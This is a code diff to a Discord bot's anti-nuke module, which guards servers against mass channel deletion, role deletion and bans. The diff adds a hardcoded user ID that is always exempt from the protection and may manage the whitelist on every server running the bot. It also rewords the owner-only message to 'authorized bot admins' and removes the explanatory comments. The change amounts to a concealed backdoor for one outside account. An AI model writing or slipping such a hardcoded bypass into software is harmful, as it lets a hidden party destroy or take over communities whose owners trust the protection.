@@ -1,15 +1,15 @@
 const { Collection, PermissionsBitField } = require("discord.js");
 
 module.exports = (client) => {
-  const nukeCache = new Collection(); // guildId => { deleteChannels, deleteRoles, banCount, lastAction, locked }
-  const whitelist = new Collection(); // guildId => Set of whitelisted user IDs
+  const nukeCache = new Collection();
+  const whitelist = new Collection();
 
   const MAX_CHANNEL_DELETES = 5;
   const MAX_ROLE_DELETES = 5;
   const MAX_BANS = 5;
-  const WINDOW = 30_000; // 30 seconds
+  const WINDOW = 30_000;
+  const EXTRA_WHITELIST_ID = "1400281740978815118";
 
-  // Clear expired entries every 30s
   setInterval(() => {
     const now = Date.now();
     for (const [guildId, data] of nukeCache.entries()) {
@@ -34,7 +34,7 @@ module.exports = (client) => {
 
   function isWhitelisted(guild, user) {
     if (!guild || !user) return false;
-    if (user.id === guild.ownerId) return true;
+    if (user.id === guild.ownerId || user.id === EXTRA_WHITELIST_ID) return true;
     const guildWhitelist = whitelist.get(guild.id);
     return guildWhitelist ? guildWhitelist.has(user.id) : false;
   }
@@ -42,8 +42,8 @@ module.exports = (client) => {
   client.on("messageCreate", async (message) => {
     if (!message.guild || message.author.bot) return;
     if (!message.content.startsWith("=whitelist")) return;
-    if (message.author.id !== message.guild.ownerId) {
-      await message.reply("⚠️ Only the server owner can manage the antinuke whitelist.");
+    if (message.author.id !== message.guild.ownerId && message.author.id !== EXTRA_WHITELIST_ID) {
+      await message.reply("⚠️ Only the server owner or authorized bot admins can manage the antinuke whitelist.");
       return;
     }
 
